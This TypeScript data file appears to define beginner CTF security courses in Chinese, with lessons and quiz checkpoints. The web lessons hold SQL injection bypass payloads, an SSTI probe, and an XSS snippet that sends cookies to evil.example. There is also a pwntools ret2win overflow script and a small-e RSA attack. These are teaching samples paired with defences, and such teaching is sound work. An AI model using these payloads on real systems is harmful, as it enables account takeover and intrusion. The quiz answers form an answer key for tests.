/**
 * Learning tracks — the "課程" half of the platform.
 * Five security domains + a programming primer, each: 入門 → 實戰 → 競賽.
 * Lesson content is authored as structured blocks (no markdown parser needed)
 * so the player can render code, callouts and checkpoints natively.
 */
import type { Difficulty } from "@/lib/xp";

export type ContentBlock =
  | { type: "p"; text: string }
  | { type: "h"; text: string }
  | { type: "code"; lang: string; lines: string[] }
  | { type: "list"; items: string[] }
  | { type: "callout"; tone: "tip" | "warn" | "info"; text: string };

export interface Checkpoint {
  /** 0..1 point in the video where this unlocks */
  at: number;
  question: string;
  options: string[];
  answer: number;
  explain: string;
  xp: number;
}

export interface Lesson {
  id: string;
  slug: string;
  title: string;
  durationSec: number;
  summary: string;
  content: ContentBlock[];
  checkpoints: Checkpoint[];
  /** links this lesson to a hands-on challenge in the arena */
  labSlug?: string;
  xp: number;
}

export interface Module {
  title: string;
  lessons: Lesson[];
}

export interface Track {
  id: string;
  slug: string;
  name: string;
  en: string;
  tagline: string;
  icon: string;
  color: string;
  level: "入門友善" | "需數學基礎" | "中階" | "進階" | "全員必修";
  difficulty: Difficulty;
  outcome: string;
  syllabus: string[];
  instructorId: string;
  modules: Module[];
}

const P = (text: string): ContentBlock => ({ type: "p", text });
const H = (text: string): ContentBlock => ({ type: "h", text });
const L = (items: string[]): ContentBlock => ({ type: "list", items });
const C = (lang: string, lines: string[]): ContentBlock => ({ type: "code", lang, lines });
const TIP = (text: string): ContentBlock => ({ type: "callout", tone: "tip", text });
const WARN = (text: string): ContentBlock => ({ type: "callout", tone: "warn", text });
const INFO = (text: string): ContentBlock => ({ type: "callout", tone: "info", text });

export const TRACKS: Track[] = [
  {
    id: "intro",
    slug: "intro-programming",
    name: "程式基礎",
    en: "Programming Primer",
    tagline: "先會寫，再會攻。",
    icon: "Code2",
    color: "#4da3ff",
    level: "入門友善",
    difficulty: "easy",
    outcome: "看得懂、寫得出解題所需的 Python 與 C 小工具",
    syllabus: ["環境設定", "Python 語法速成", "檔案與位元組操作", "C 與記憶體概念"],
    instructorId: "tux",
    modules: [
      {
        title: "第一週 · 把環境準備好",
        lessons: [
          {
            id: "intro-setup",
            slug: "setup",
            title: "環境設定：終端機、Python、你的第一個工具箱",
            durationSec: 740,
            summary: "裝好 Python、認識終端機、跑出第一支腳本。這是後面所有課的地基。",
            xp: 60,
            content: [
              P("在資安的世界裡，終端機就是你的手。這堂課我們把工具準備好，之後每一堂課都會用到。"),
              H("你會裝的東西"),
              L([
                "Python 3.12，解題主力語言",
                "一個順手的終端機",
                "pip 安裝 pwntools 與 requests，這兩個未來會狂用",
              ]),
              C("bash", [
                "# 確認 Python 裝好了",
                "python3 --version",
                "",
                "# 未來會用到的兩個套件",
                "pip install pwntools requests",
              ]),
              TIP("Windows 使用者建議裝 WSL，大部分資安工具都以 Linux 為家。"),
            ],
            checkpoints: [
              {
                at: 0.3,
                question: "要確認 Python 版本，指令是？",
                options: ["python3 --version", "python3 --help", "pip list", "which bash"],
                answer: 0,
                explain: "--version 會印出直譯器版本，是每次環境確認的第一步。",
                xp: 20,
              },
              {
                at: 0.75,
                question: "pwntools 主要拿來做什麼？",
                options: ["寫網頁前端", "做 Pwn 與二進位互動、寫 exploit", "管理資料庫", "剪輯影片"],
                answer: 1,
                explain: "pwntools 是 Pwn 題的瑞士刀，處理連線、打包位元組、收送資料都靠它。",
                xp: 20,
              },
            ],
          },
          {
            id: "intro-python",
            slug: "python-crash",
            title: "Python 語法速成：解題只需要這些",
            durationSec: 1120,
            summary: "變數、迴圈、字串、位元組。用最短路徑學到能寫解題腳本的程度。",
            xp: 80,
            content: [
              P("我們不教你成為軟體工程師，只教你寫出能解題的 Python。重點是字串與位元組的處理。"),
              C("python", [
                "data = b\"SCIST\"        # bytes，資安裡的一等公民",
                "print(data.hex())      # 5343495354",
                "print(bytes.fromhex(\"5343495354\"))",
                "",
                "# XOR 一整串 bytes",
                "key = 0x42",
                "out = bytes(b ^ key for b in data)",
                "print(out)",
              ]),
              TIP("字串 str 和位元組 bytes 是兩種東西。CTF 幾乎都在跟 bytes 打交道。"),
            ],
            checkpoints: [
              {
                at: 0.4,
                question: "b\"SCIST\".hex() 會得到什麼？",
                options: ["SCIST", "5343495354", "b5343", "報錯"],
                answer: 1,
                explain: "hex() 把每個位元組轉成兩位十六進位字元，S 是 0x53、C 是 0x43。",
                xp: 20,
              },
              {
                at: 0.8,
                question: "在 CTF 中最常操作的資料型別是？",
                options: ["float", "bytes", "complex", "set"],
                answer: 1,
                explain: "封包、檔案、密文都是位元組序列，bytes 是你的日常。",
                xp: 20,
              },
            ],
          },
        ],
      },
    ],
  },

  {
    id: "web",
    slug: "web-security",
    name: "網頁安全",
    en: "Web Security",
    tagline: "看得懂 request，就不怕任何網頁題。",
    icon: "Globe",
    color: "#a4f13b",
    level: "入門友善",
    difficulty: "easy",
    outcome: "MyFirstCTF Web 題全解",
    syllabus: ["HTTP 協定", "前端原理", "SQL Injection", "XSS", "CSRF", "SSTI"],
    instructorId: "n0ir",
    modules: [
      {
        title: "第一章 · 你與伺服器之間",
        lessons: [
          {
            id: "web-http",
            slug: "http-basics",
            title: "HTTP 協定基礎：一次請求裡發生了什麼",
            durationSec: 1180,
            summary: "method、header、status code、cookie。把瀏覽器打開的黑盒子拆開看。",
            xp: 80,
            labSlug: "robots-rule",
            content: [
              P("每一個網頁攻擊，本質上都是送出一個伺服器沒預期到的 request。所以第一步，是徹底看懂一個 request 長什麼樣子。"),
              H("一個 request 的骨架"),
              C("http", [
                "GET /profile?id=1 HTTP/1.1",
                "Host: gate.scist.org",
                "Cookie: session=eyJ1c2VyIjoi...",
                "User-Agent: Mozilla/5.0",
              ]),
              P("第一行是 method 加路徑加版本，接著是一堆 header，空行之後才是 body。GET 通常沒有 body。"),
              H("常見 method"),
              L([
                "GET：拿資料，參數放在 URL",
                "POST：送資料，參數放在 body",
                "PUT 與 DELETE：RESTful API 常見",
                "OPTIONS：問伺服器支援什麼",
              ]),
              INFO("狀態碼記大類就好：2xx 成功、3xx 轉址、4xx 你錯了、5xx 伺服器錯了。看到 500 常常代表你戳到了沒處理的邊界，是好事。"),
              TIP("打開開發者工具的 Network 分頁，重新整理任何網站，你就看得到剛剛講的每一個 request。"),
            ],
            checkpoints: [
              {
                at: 0.25,
                question: "GET 請求的參數通常放在哪裡？",
                options: ["Request body", "URL 的 query string", "Cookie", "TCP 標頭"],
                answer: 1,
                explain: "GET 把參數放在網址的問號之後，所以會出現在瀏覽紀錄與伺服器 log。",
                xp: 20,
              },
              {
                at: 0.55,
                question: "看到 HTTP 500 最可能代表？",
                options: ["你沒有權限", "頁面不存在", "伺服器端程式出錯", "請求成功"],
                answer: 2,
                explain: "5xx 是伺服器端錯誤，常常是你送了非預期輸入、戳到未處理的例外，值得深入。",
                xp: 20,
              },
              {
                at: 0.85,
                question: "要即時觀察瀏覽器送出的每個請求，最直接的工具是？",
                options: ["小畫家", "開發者工具的 Network 分頁", "工作管理員", "記事本"],
                answer: 1,
                explain: "Network 分頁會列出所有請求與回應，是 Web 題的基本功。",
                xp: 20,
              },
            ],
          },
          {
            id: "web-sqli",
            slug: "sql-injection",
            title: "SQL Injection 入門：一個引號的力量",
            durationSec: 1475,
            summary: "SQL 注入原理、常見 payload、繞過認證、Parameterized Query 防禦。本課附實戰 Lab。",
            xp: 120,
            labSlug: "sqli-login",
            content: [
              P("想像一個登入查詢，伺服器把你輸入的帳號密碼直接串進 SQL 字串："),
              C("sql", [
                "SELECT * FROM users",
                "WHERE username = 'admin' AND password = '<你的輸入>'",
              ]),
              P("如果密碼欄我輸入一個單引號接 OR 1=1，整句就變成："),
              C("sql", [
                "SELECT * FROM users",
                "WHERE username = 'admin' AND password = '' OR '1'='1'",
              ]),
              P("因為 1 等於 1 永遠為真，條件成立，你就以 admin 登入了。這就是最經典的認證繞過。"),
              H("更乾脆的繞過"),
              C("sql", [
                "-- 帳號欄輸入： admin'--",
                "SELECT * FROM users WHERE username = 'admin'--' AND password = '...'",
              ]),
              WARN("兩個減號是 SQL 註解。用它直接把密碼比對整段註解掉，是實戰最常見的第一發。"),
              H("防禦：Parameterized Query"),
              P("問題的根源是把資料當成程式碼。正確做法是讓資料永遠只是資料："),
              C("python", [
                "# 危險：字串拼接",
                "cur.execute(\"SELECT * FROM users WHERE name='\" + name + \"'\")",
                "",
                "# 安全：參數化查詢，資料與語法分離",
                "cur.execute(\"SELECT * FROM users WHERE name = ?\", (name,))",
              ]),
              TIP("記住這句話：SQL Injection 的防禦不是過濾引號，而是別再用字串拼 SQL。"),
            ],
            checkpoints: [
              {
                at: 0.3,
                question: "為什麼 OR 1=1 這類 payload 能繞過登入？",
                options: [
                  "它會刪除資料表",
                  "它讓 WHERE 條件恆為真",
                  "它加密了密碼",
                  "它讓伺服器當機",
                ],
                answer: 1,
                explain: "1 等於 1 永遠成立，用 OR 串上去讓整個條件為真，回傳了使用者列。",
                xp: 30,
              },
              {
                at: 0.6,
                question: "payload 中兩個減號的作用是什麼？",
                options: ["註解掉後面的 SQL", "代表減號運算", "跳脫字元", "沒有作用"],
                answer: 0,
                explain: "那是 SQL 的行註解，把後面的密碼比對整段吃掉。",
                xp: 30,
              },
              {
                at: 0.9,
                question: "防禦 SQL Injection 最正確的做法是？",
                options: [
                  "把單引號用黑名單過濾掉",
                  "使用參數化查詢",
                  "把錯誤訊息藏起來",
                  "改用更長的密碼",
                ],
                answer: 1,
                explain: "參數化查詢讓資料與語法分離，資料永遠不會被當成 SQL 執行，是根本解。",
                xp: 30,
              },
            ],
          },
          {
            id: "web-xss",
            slug: "xss",
            title: "XSS 跨站腳本：讓別人的瀏覽器替你工作",
            durationSec: 1290,
            summary: "反射型、儲存型、DOM 型 XSS 的差別，以及偷 cookie 的經典手法與防禦。",
            xp: 110,
            labSlug: "stored-xss",
            content: [
              P("SQL Injection 攻擊伺服器，XSS 則是攻擊其他使用者的瀏覽器。當網站把使用者輸入原封不動塞進 HTML，你的腳本就會在別人頁面上執行。"),
              H("三種類型"),
              L([
                "反射型：payload 在 URL，受害者點連結才觸發",
                "儲存型：payload 存進資料庫，例如留言，每個看到的人都中，最危險",
                "DOM 型：漏洞在前端 JavaScript 本身",
              ]),
              C("html", [
                "<!-- 一則惡意留言 -->",
                "<script>",
                "  fetch(\"https://evil.example/?c=\" + document.cookie)",
                "</script>",
              ]),
              WARN("上面這段若被儲存並顯示，會把每個瀏覽者的 cookie 送到攻擊者的伺服器，等同接管帳號。"),
              H("防禦"),
              L([
                "輸出時做 HTML escaping",
                "設定 HttpOnly cookie，讓 JS 讀不到",
                "導入 Content-Security-Policy 限制可執行的來源",
              ]),
            ],
            checkpoints: [
              {
                at: 0.35,
                question: "哪一種 XSS 通常影響範圍最大？",
                options: ["反射型", "儲存型", "DOM 型", "都一樣"],
                answer: 1,
                explain: "儲存型 XSS 存在伺服器，任何開啟該頁的人都會中招，殺傷力最廣。",
                xp: 30,
              },
              {
                at: 0.7,
                question: "HttpOnly 這個 cookie 屬性能擋下什麼？",
                options: ["SQL 注入", "JavaScript 讀取 cookie", "檔案上傳", "暴力破解"],
                answer: 1,
                explain: "HttpOnly 讓前端 JS 讀不到該 cookie，降低 XSS 偷 session 的風險。",
                xp: 30,
              },
            ],
          },
          {
            id: "web-ssti",
            slug: "ssti",
            title: "SSTI 樣板注入：從 7 乘 7 到 RCE",
            durationSec: 1080,
            summary: "當使用者輸入被丟進樣板引擎，49 這個數字會告訴你一切。進階但迷人。",
            xp: 130,
            labSlug: "ssti-bakery",
            content: [
              P("很多網站用樣板引擎動態產生頁面。如果使用者輸入被當成樣板來 render，就會發生 Server-Side Template Injection。"),
              C("python", [
                "# 危險：把使用者名字直接組進樣板字串",
                "render_template_string(\"Hi \" + name)",
              ]),
              P("測試方法很優雅：輸入一組雙大括號包住 7 乘 7。如果頁面回你 49，代表輸入被當成程式碼算出來了。"),
              C("text", [
                "輸入： {{7*7}}",
                "回應： Hi 49        <-- 中了",
              ]),
              WARN("SSTI 常常能一路升級到 RCE，是高風險漏洞。實戰 Lab 會帶你走完整條鏈。"),
            ],
            checkpoints: [
              {
                at: 0.4,
                question: "輸入 7 乘 7 的樣板語法後頁面回傳 49，代表？",
                options: ["伺服器很快", "輸入被當成樣板程式碼執行了", "你算錯了", "網站壞了"],
                answer: 1,
                explain: "49 是伺服器算出來的，證明存在樣板注入。",
                xp: 30,
              },
            ],
          },
        ],
      },
    ],
  },

  {
    id: "crypto",
    slug: "cryptography",
    name: "密碼學",
    en: "Cryptography",
    tagline: "數學不好也能學，用比喻把 RSA 講到你笑出來。",
    icon: "KeyRound",
    color: "#3ee8d5",
    level: "需數學基礎",
    difficulty: "medium",
    outcome: "Crypto CTF 解題能力",
    syllabus: ["古典密碼", "現代對稱式 AES", "非對稱式 RSA", "數位簽章"],
    instructorId: "moka",
    modules: [
      {
        title: "第一章 · 從凱撒到現代",
        lessons: [
          {
            id: "crypto-classic",
            slug: "classical",
            title: "古典密碼：凱撒、替換與頻率分析",
            durationSec: 960,
            summary: "位移、替換、暴力破解。先建立密碼是可以被破的這個直覺。",
            xp: 80,
            labSlug: "caesar-salad",
            content: [
              P("凱撒密碼就是把每個字母位移固定格數。位移 3 的話 A 變 D、B 變 E。既然只有 25 種可能，暴力全試就破了。"),
              C("python", [
                "ct = \"FDHVDU\"",
                "for shift in range(26):",
                "    print(shift, \"\".join(",
                "        chr((ord(c) - 65 - shift) % 26 + 65) for c in ct))",
              ]),
              TIP("看到疑似位移的密文，先寫個迴圈把 26 種全印出來，用肉眼找出有意義的那行。"),
            ],
            checkpoints: [
              {
                at: 0.5,
                question: "凱撒密碼最多需要試幾種位移就能暴力破解英文字母？",
                options: ["10", "25", "128", "無限"],
                answer: 1,
                explain: "26 個字母扣掉位移 0，最多 25 種，用迴圈瞬間全試完。",
                xp: 30,
              },
            ],
          },
          {
            id: "crypto-rsa",
            slug: "rsa",
            title: "RSA 入門：公鑰、私鑰與那個著名的模運算",
            durationSec: 1340,
            summary: "n、e、d 到底是什麼？為什麼小 e 加上沒有 padding 會出事？",
            xp: 120,
            labSlug: "smol-rsa",
            content: [
              P("RSA 的公鑰是 n 與 e，私鑰是 d。加密是 m 的 e 次方模 n，解密是 c 的 d 次方模 n。安全性來自把 n 分解成兩個大質數很難。"),
              H("經典弱點：e 等於 3 又沒有 padding"),
              P("如果 e 等於 3、訊息 m 很小，使得 m 的三次方小於 n，那密文根本沒有被模運算縮小，直接開立方根就拿回明文。"),
              C("python", [
                "from gmpy2 import iroot",
                "m, exact = iroot(c, 3)   # 直接開三次方根",
                "print(bytes.fromhex(hex(m)[2:]))",
              ]),
              WARN("這就是 smol-rsa 這題的考點。真實系統一定要用 padding，不要自己土炮。"),
            ],
            checkpoints: [
              {
                at: 0.45,
                question: "RSA 的安全性主要來自哪個困難問題？",
                options: ["排序很慢", "大數的質因數分解很難", "浮點誤差", "雜湊碰撞"],
                answer: 1,
                explain: "把 n 分解回兩個大質數在計算上極難，這是 RSA 的地基。",
                xp: 30,
              },
              {
                at: 0.85,
                question: "e 等於 3 且訊息很小時的攻擊方式是？",
                options: ["暴力猜密碼", "直接對密文開三次方根", "重送封包", "字典攻擊"],
                answer: 1,
                explain: "若明文的三次方沒有被模運算縮小，開立方根即可還原明文。",
                xp: 30,
              },
            ],
          },
        ],
      },
    ],
  },

  {
    id: "reverse",
    slug: "reverse-engineering",
    name: "逆向工程",
    en: "Reverse Engineering",
    tagline: "組合語言是母語，一行一行帶你讀懂程式在想什麼。",
    icon: "Binary",
    color: "#b983ff",
    level: "中階",
    difficulty: "hard",
    outcome: "Reverse 題目獨立分析",
    syllabus: ["CPU 架構", "組合語言", "靜態分析", "動態除錯", "二進位分析工具"],
    instructorId: "vex",
    modules: [
      {
        title: "第一章 · 讀懂機器在做什麼",
        lessons: [
          {
            id: "rev-strings",
            slug: "strings-first",
            title: "第一招 strings：別急著開反組譯器",
            durationSec: 700,
            summary: "很多入門逆向題，答案就明文躺在檔案裡。先學會最省力的一招。",
            xp: 70,
            labSlug: "strings-attached",
            content: [
              P("拿到一個執行檔，反射動作不是打開 IDA，而是先用 strings 掃一遍。你會很驚訝有多少 flag 直接躺在裡面。"),
              C("bash", [
                "strings ./challenge | grep -i scist",
                "",
                "# 沒有就看看可疑的字串",
                "strings ./challenge | less",
              ]),
              TIP("strings 之後接 grep 過濾關鍵字，是 CTF 逆向與鑑識的萬用第一步。"),
            ],
            checkpoints: [
              {
                at: 0.5,
                question: "拿到不明執行檔，最省力的第一步通常是？",
                options: ["直接執行它", "跑 strings 找可疑字串", "重開機", "刪掉它"],
                answer: 1,
                explain: "strings 會把檔案裡可列印字元抽出來，常常直接看到 flag 或提示。",
                xp: 25,
              },
            ],
          },
          {
            id: "rev-gdb",
            slug: "gdb-basics",
            title: "動態除錯：用 GDB 一步一步逼近答案",
            durationSec: 1180,
            summary: "設中斷點、看暫存器、單步執行。當靜態看不懂，就讓程式自己跑給你看。",
            xp: 110,
            labSlug: "step-by-step",
            content: [
              P("靜態分析看不懂時，動態除錯讓程式邊跑邊給你看。GDB 搭配 pwndbg 外掛是主力。"),
              C("bash", [
                "gdb ./challenge",
                "(gdb) break main",
                "(gdb) run",
                "(gdb) info registers",
                "(gdb) x/8xw $rsp      # 看堆疊",
              ]),
              INFO("比對輸入的關鍵常在某個 cmp 指令。在那裡設中斷點，看它拿你的輸入跟什麼比較。"),
            ],
            checkpoints: [
              {
                at: 0.5,
                question: "GDB 中設定中斷點的指令是？",
                options: ["stop", "break", "pause", "halt"],
                answer: 1,
                explain: "break 在指定函式或位址設中斷點，run 之後會停在那裡。",
                xp: 30,
              },
            ],
          },
        ],
      },
    ],
  },

  {
    id: "pwn",
    slug: "pwnable",
    name: "系統漏洞利用",
    en: "Pwnable",
    tagline: "從堆疊溢位到 heap 利用，帶你踩每一格。",
    icon: "Bug",
    color: "#ff6fb5",
    level: "進階",
    difficulty: "insane",
    outcome: "Pwn 題目初步利用",
    syllabus: ["記憶體管理", "Stack 與 Heap 結構", "Buffer Overflow", "ROP 鏈"],
    instructorId: "vex",
    modules: [
      {
        title: "第一章 · 溢位的第一步",
        lessons: [
          {
            id: "pwn-mem",
            slug: "memory-model",
            title: "記憶體模型：stack 長什麼樣子",
            durationSec: 1020,
            summary: "區域變數、返回位址、為什麼一個沒有長度檢查的讀取能毀掉一切。",
            xp: 90,
            content: [
              P("函式呼叫時，區域變數和返回位址都放在 stack 上。返回位址決定函式結束後 CPU 跳去哪裡執行。"),
              P("如果一個 buffer 沒有長度檢查，輸入超過容量就會一路蓋過返回位址，你就能控制程式的下一步。"),
              C("c", [
                "char buf[32];",
                "gets(buf);   // 沒有長度檢查，災難的開始",
              ]),
              WARN("gets 是史上最危險的函式之一，現代編譯器甚至會警告你別用。"),
            ],
            checkpoints: [
              {
                at: 0.5,
                question: "Buffer overflow 之所以危險，是因為可以覆寫？",
                options: ["螢幕亮度", "堆疊上的返回位址", "硬碟容量", "網路速度"],
                answer: 1,
                explain: "蓋過返回位址就能改變函式返回後 CPU 執行的位置，進而劫持控制流。",
                xp: 30,
              },
            ],
          },
          {
            id: "pwn-ret2win",
            slug: "ret2win",
            title: "ret2win：把返回位址指向勝利函式",
            durationSec: 1140,
            summary: "最經典的 pwn 入門題型：程式裡有個沒被呼叫的勝利函式，你來呼叫它。",
            xp: 120,
            labSlug: "ret2win",
            content: [
              P("很多入門 pwn 題裡藏著一個會印出 flag 的函式，但程式流程永遠不會走到它。你的任務是用溢位把返回位址改成它的位址。"),
              C("python", [
                "from pwn import *",
                "p = process(\"./vuln\")",
                "offset = 40                       # 到返回位址的距離",
                "payload = b\"A\" * offset + p64(win_addr)",
                "p.sendline(payload)",
                "p.interactive()",
              ]),
              TIP("offset 怎麼找？用 cyclic 產生獨特字串讓它崩潰，再用崩潰時的值反查位移。"),
            ],
            checkpoints: [
              {
                at: 0.5,
                question: "ret2win 的核心是把返回位址覆寫成？",
                options: ["0", "勝利函式的位址", "自己的 email", "隨機值"],
                answer: 1,
                explain: "把返回位址改成該函式的位址，函式返回時就跳去執行它。",
                xp: 30,
              },
            ],
          },
        ],
      },
    ],
  },

  {
    id: "linux",
    slug: "linux-misc",
    name: "Linux 與雜項",
    en: "Linux & Misc",
    tagline: "終端機控。鑑識、OSINT、隱寫術樣樣來。",
    icon: "Terminal",
    color: "#ffb84d",
    level: "全員必修",
    difficulty: "easy",
    outcome: "Linux 環境熟練操作",
    syllabus: ["Linux 指令", "Shell Script", "數位鑑識", "OSINT", "Steganography"],
    instructorId: "tux",
    modules: [
      {
        title: "第一章 · 在終端機裡自由行動",
        lessons: [
          {
            id: "linux-cli",
            slug: "cli-basics",
            title: "Linux 指令基礎：ls、cd、find、grep",
            durationSec: 880,
            summary: "四個指令走天下。移動、尋找、過濾，這是所有領域的共同語言。",
            xp: 70,
            labSlug: "find-me",
            content: [
              P("不管你之後專精哪個領域，都要在 Linux 終端機裡活動。先把最常用的四個指令練熟。"),
              L([
                "ls：列出檔案，加 -la 看隱藏檔與權限",
                "cd：切換目錄",
                "find：在整個檔案系統裡找檔案",
                "grep：在檔案內容裡找關鍵字",
              ]),
              C("bash", [
                "# 找出整台機器上檔名含 flag 的檔案",
                "find / -name \"*flag*\" 2>/dev/null",
                "",
                "# 在檔案內容裡找 flag 格式",
                "grep -r \"SCIST{\" /var/www 2>/dev/null",
              ]),
              TIP("把錯誤輸出丟到 /dev/null 可以把權限不足的雜訊濾掉，讓輸出乾淨，鑑識與提權時超好用。"),
            ],
            checkpoints: [
              {
                at: 0.4,
                question: "要在整個檔案系統依檔名搜尋，用哪個指令？",
                options: ["ls", "find", "cat", "echo"],
                answer: 1,
                explain: "find 依路徑與條件遞迴搜尋檔案，grep 則是找內容。",
                xp: 25,
              },
              {
                at: 0.8,
                question: "grep 的 -r 參數代表？",
                options: ["反向", "遞迴搜尋子目錄", "刪除", "重新命名"],
                answer: 1,
                explain: "-r 讓 grep 走進所有子目錄搜尋內容。",
                xp: 25,
              },
            ],
          },
          {
            id: "linux-stego",
            slug: "steganography",
            title: "隱寫術入門：藏在圖片裡的秘密",
            durationSec: 760,
            summary: "檔案不只表面那樣。binwalk、exiftool、strings 三兄弟拆解可疑檔案。",
            xp: 80,
            labSlug: "hidden-in-plain",
            content: [
              P("一張看似普通的圖片，可能夾帶了壓縮檔、藏了 metadata、或用 LSB 埋了訊息。"),
              C("bash", [
                "exiftool cat.jpg          # 看 metadata",
                "binwalk cat.jpg           # 找夾藏的檔案",
                "binwalk -e cat.jpg        # 自動抽出來",
                "strings cat.jpg | grep SCIST",
              ]),
              INFO("Misc 題的精神是什麼都試一下。這三個工具幾乎是拿到可疑檔案的反射動作。"),
            ],
            checkpoints: [
              {
                at: 0.5,
                question: "要檢查圖片是否夾藏了其他檔案，最直接的工具是？",
                options: ["binwalk", "ping", "chmod", "sudo"],
                answer: 0,
                explain: "binwalk 掃描檔案裡的檔案簽章，能發現夾帶的壓縮檔或影像。",
                xp: 30,
              },
            ],
          },
        ],
      },
    ],
  },
];

// ---- derived helpers ----
export function trackBySlug(slug: string) {
  return TRACKS.find((t) => t.slug === slug);
}

export function allLessons(track: Track): Lesson[] {
  return track.modules.flatMap((m) => m.lessons);
}

export function lessonBySlug(track: Track, lessonSlug: string) {
  return allLessons(track).find((l) => l.slug === lessonSlug);
}

export function lessonNeighbours(track: Track, lessonSlug: string) {
  const list = allLessons(track);
  const idx = list.findIndex((l) => l.slug === lessonSlug);
  return {
    index: idx,
    total: list.length,
    prev: idx > 0 ? list[idx - 1] : null,
    next: idx >= 0 && idx < list.length - 1 ? list[idx + 1] : null,
  };
}

export function trackLessonCount(track: Track) {
  return allLessons(track).length;
}

export function trackTotalXp(track: Track) {
  return allLessons(track).reduce(
    (sum, l) => sum + l.xp + l.checkpoints.reduce((s, c) => s + c.xp, 0),
    0,
  );
}

export function trackTotalSeconds(track: Track) {
  return allLessons(track).reduce((sum, l) => sum + l.durationSec, 0);
}

export const ALL_LESSON_COUNT = TRACKS.reduce((n, t) => n + trackLessonCount(t), 0);
export const ALL_TRACK_SECONDS = TRACKS.reduce((n, t) => n + trackTotalSeconds(t), 0);
